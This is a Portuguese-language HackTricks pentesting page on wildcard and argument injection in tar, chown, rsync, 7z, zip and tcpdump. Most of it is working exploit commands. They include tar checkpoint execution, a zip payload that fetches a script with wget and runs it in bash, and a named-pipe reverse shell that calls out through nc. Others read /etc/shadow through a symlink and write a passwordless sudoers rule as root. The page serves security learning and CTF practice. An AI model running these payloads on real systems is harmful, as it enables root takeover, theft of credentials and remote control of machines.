# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) argument injection ocorre quando um script privilegiado executa um binário Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … com um wildcard não entre aspas como `*`.
> Como o shell expande o wildcard **antes** de executar o binário, um atacante que consiga criar arquivos no diretório de trabalho pode criar nomes de arquivo que comecem com `-` para que sejam interpretados como **opções em vez de dados**, efetivamente contrabandeando flags arbitrárias ou até comandos.
> Esta página reúne os primitivos mais úteis, pesquisas recentes e detecções modernas para 2023-2025.

## chown / chmod

Você pode **copiar o dono/grupo ou os bits de permissão de um arquivo arbitrário** abusando da flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Quando root mais tarde executar algo como:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` é injetado, fazendo com que *todos* os arquivos correspondentes herdem a propriedade/permissões de `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Veja também o paper clássico da DefenseCode para detalhes.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Execute comandos arbitrários abusando do recurso **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Uma vez que o root execute, por exemplo, `tar -czf /root/backup.tgz *`, `shell.sh` é executado como root.

### bsdtar / macOS 14+

O `tar` padrão em macOS recentes (baseado em `libarchive`) *não* implementa `--checkpoint`, mas você ainda pode conseguir execução de código com a opção **--use-compress-program**, que permite especificar um compressor externo.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Quando um script privilegiado executa `tar -cf backup.tar *`, `/bin/sh` será iniciado.

---

## rsync

`rsync` permite sobrescrever o shell remoto ou até o binário remoto via flags de linha de comando que começam com `-e` ou `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Se root mais tarde arquivar o diretório com `rsync -az * backup:/srv/`, a flag injetada fará com que sua shell seja iniciada no lado remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` modo).

---

## 7-Zip / 7z / 7za

Mesmo quando o script privilegiado *defensivamente* prefixa o curinga com `--` (para impedir a análise de opções), o formato 7-Zip suporta **arquivos de lista de arquivos** ao prefixar o nome do arquivo com `@`. Combinar isso com um symlink permite *exfiltrar arquivos arbitrários*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Se root executar algo como:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tentará ler `root.txt` (→ `/etc/shadow`) como uma lista de arquivos e abortará, **imprimindo o conteúdo em stderr**.

---

## zip

Existem duas primitivas muito práticas quando uma aplicação passa nomes de arquivos controlados pelo usuário para `zip` (ou via um wildcard ou enumerando nomes sem `--`).

- RCE via test hook: `-T` habilita “test archive” e `-TT <cmd>` substitui o tester por um programa arbitrário (forma longa: `--unzip-command <cmd>`). Se você puder injetar nomes de arquivos que comecem com `-`, divida as flags entre nomes de arquivos distintos para que a análise de opções curtas funcione:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notas
- NÃO tente um único nome de arquivo como `'-T -TT <cmd>'` — opções curtas são analisadas por caractere e isso falhará. Use tokens separados como mostrado.
- Se as barras forem removidas dos nomes de arquivo pela app, recupere de um host/IP puro (caminho padrão `/index.html`) e salve localmente com `-O`, então execute.
- Você pode depurar o parsing com `-sc` (mostrar argv processados) ou `-h2` (mais ajuda) para entender como seus tokens são consumidos.

Exemplo (comportamento local no zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Se a camada web ecoa o stdout/stderr do `zip` (comum em wrappers ingênuos), flags injetadas como `--help` ou erros por opções inválidas irão aparecer na resposta HTTP, confirmando command-line injection e ajudando a ajustar o payload.

---

## Binários adicionais vulneráveis a wildcard injection (lista rápida 2023-2025)

Os seguintes comandos foram abusados em CTFs modernos e em ambientes reais. O payload é sempre criado como um *filename* dentro de um diretório gravável que depois será processado com um wildcard:

| Binário | Flag para abusar | Efeito |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Ler o conteúdo de arquivos |
| `flock` | `-c <cmd>` | Executar comando |
| `git`   | `-c core.sshCommand=<cmd>` | Execução de comando via git sobre SSH |
| `scp`   | `-S <cmd>` | Disparar um programa arbitrário em vez do ssh |

Essas primitivas são menos comuns que os clássicos *tar/rsync/zip*, mas vale a pena checá-las durante a caça.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Quando um shell restrito ou um vendor wrapper constrói uma linha de comando do `tcpdump` concatenando campos controlados pelo usuário (por exemplo, um parâmetro "file name") sem quoting/validação rigorosa, você pode contrabandear flags extras para o `tcpdump`. A combinação de `-G` (time-based rotation), `-W` (limita o número de arquivos) e `-z <cmd>` (comando pós-rotacionamento) resulta em execução arbitrária de comandos como o usuário que está executando o tcpdump (frequentemente root em appliances).

Pré-requisitos:

- Você pode influenciar o `argv` passado para o `tcpdump` (por exemplo, via um wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).
- O wrapper não sanitiza espaços ou tokens prefixados por `-` no campo do nome do arquivo.

Classic PoC (executes a reverse shell script from a writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` força uma rotação imediata após o primeiro pacote correspondente.
- `-z <cmd>` executa o comando pós-rotação uma vez por rotação. Muitas builds executam `<cmd> <savefile>`. Se `<cmd>` for um script/interpretador, verifique se o tratamento de argumentos corresponde ao seu payload.

No-removable-media variants:

- If you have any other primitive to write files (e.g., a separate command wrapper that allows output redirection), drop your script into a known path and trigger `-z /bin/sh /path/script.sh` or `-z /path/script.sh` depending on platform semantics.
- Some vendor wrappers rotate to attacker-controllable locations. If you can influence the rotated path (symlink/directory traversal), you can steer `-z` to execute content you fully control without external media.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Anti-padrão muito comum no sudoers:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemas
- O glob `*` e padrões permissivos apenas restringem o primeiro argumento `-w`. `tcpdump` aceita múltiplas opções `-w`; a última vence.
- A regra não fixa outras opções, então `-Z`, `-r`, `-V`, etc. são permitidas.

Primitivas
- Sobrescreve o caminho de destino com um segundo `-w` (o primeiro apenas satisfaz o sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal dentro do primeiro `-w` para escapar da árvore restrita:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forçar a propriedade de saída com `-Z root` (cria arquivos de propriedade do root em qualquer lugar):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Gravação de conteúdo arbitrário reexecutando um PCAP criado via `-r` (por exemplo, para inserir uma linha em sudoers):

<details>
<summary>Crie um PCAP que contenha o payload ASCII exato e escreva-o como root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Leitura arbitrária de arquivos/secret leak com `-V <file>` (interpreta uma lista de savefiles). Diagnósticos de erro frequentemente ecoam linhas, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referências

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
